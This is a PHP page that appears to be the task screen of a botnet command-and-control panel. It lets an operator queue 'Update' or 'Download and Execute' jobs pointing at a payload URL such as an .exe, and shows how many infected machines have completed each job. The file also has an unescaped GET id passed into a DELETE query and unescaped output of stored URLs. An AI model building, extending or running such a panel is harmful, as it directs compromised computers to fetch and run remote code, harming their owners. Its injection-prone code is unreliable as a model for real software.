<?php 
include('header.php');

?>
		<!--end content-->

		
		
		
		 
		 <div class="col-md-12">
               <div class="panel-default" style="opacity: 0.8;background-image: linear-gradient(to bottom,#232323 0,#232323 100%);">
				<div class="panel-body table-bordered" style="font-size:14px; padding-left:40px;padding-right:40px;padding-bottom:25px;padding-top:25px;">
				<form method="POST">
				<h2>Create New Task</h2>
								<div class="form-group" style="margin-top:10px;">
								    <label> URL Payload File  </label>
								  <input name="link_dir" type="link" class="form-control" placeholder="expamle : http://site.com/file.exe">
								</div>
								<div class="form-group" style="margin-top:10px;">
								<label> Type of task </label>
								<select name="type_task" class="form-control">
								  <option value="update">Update</option>
								  <option value="DownloadAndRun">Download and Execute</option>
								</select>  
								
								</div>
	
								<button name="submit" type="submit" class="btn-blue"> Add Task  <span class="ion-android-add"></span></button>
								<button type="reset" class="btn-close"> Reset  <span class="ion-android-delete"></span></button>
							  </form>
				<?php
	mysqli_query($condb,"set character_set_server='utf8'"); 
	mysqli_query($condb,"SET NAMES 'utf8'");
			
		if(isset($_POST['submit'])){
			
			$link_dir = mysqli_real_escape_string($condb,$_POST['link_dir']);

			$type_task = mysqli_real_escape_string($condb,$_POST['type_task']);
			

			if(empty($link_dir) or empty($type_task)){
				   
				echo "<div style='opacity: 0.8;margin-top:10px;' class='text-center alert alert-danger' role='alert'><h4> Error input </h4></div>";
			    	
				 }else{
						$sql = "INSERT INTO `tasks`(`task_type`, `url_file`) VALUES ('$type_task' ,'$link_dir')";
						mysqli_query($condb,"set character_set_server='utf8'"); 
						mysqli_query($condb,"set names 'utf8'");
						mysqli_query($condb,$sql);	    
						echo "<div style='opacity: 0.8;margin-top:10px;'  class='text-center alert alert-success' role='alert'><h4> Added successfully </h4></div>";

		

						

				 
				 }
			
		} 

?>
				</div>
			</div>
		 <br />
		 <div class="table-responsive" style="opacity: 0.8;background-image: linear-gradient(to bottom,#232323 0,#232323 100%);">
			   <table class="table table-bordered table-hover">
				 <tr>
				 <td class="col-md-2">ID</td>
				 <td class="col-md-2">Task Type</td>
				 <td class="col-md-2">Link File</td>
				 <td class="col-md-2">completed</td>
				 <td class="col-md-2">Action</td>
				
				 </tr>
				 <?php
				         $querypost="SELECT * FROM tasks";
						 mysqli_query($condb,"set character_set_server='utf8'"); 
						 mysqli_query($condb,"SET NAMES 'utf8'");
						 $result=mysqli_query($condb,$querypost);
				 
				 
				 
						 while($rows=@mysqli_fetch_array($result))
							{
                                 
				               $q_check = "SELECT * FROM `completed` WHERE `task_id`=".$rows['task_id']."";
							   $query_check = mysqli_query($condb,$q_check);
							   $count_rows = mysqli_num_rows($query_check);
							   
							   echo'<tr>
							   <td class="col-md-2">'.$rows['task_id'].'</td>
							   <td class="col-md-2">'.$rows['task_type'].'</td>
							   <td class="col-md-2">'.$rows['url_file'].'</td>
							   <td class="col-md-2">'.$count_rows.'</td>
							   <td class="col-md-2" style="padding-bottom: 12px;"><a class="btn-delete" href="tasks.php?id='.$rows['task_id'].'"> Delete</a></td>
							     </tr>
				 
									 ';
						     }
				 
				 ?>


		</table>
		 
		 
		 </div>



		</div>
<?php
$id = @$_GET['id'];
    if(isset($id)){
		mysqli_query($condb,"DELETE FROM `tasks` WHERE `task_id`='$id'");
		echo '<meta http-equiv="refresh" content="1;url=tasks.php" />';
	}

?>
<?php include('footer.php');?>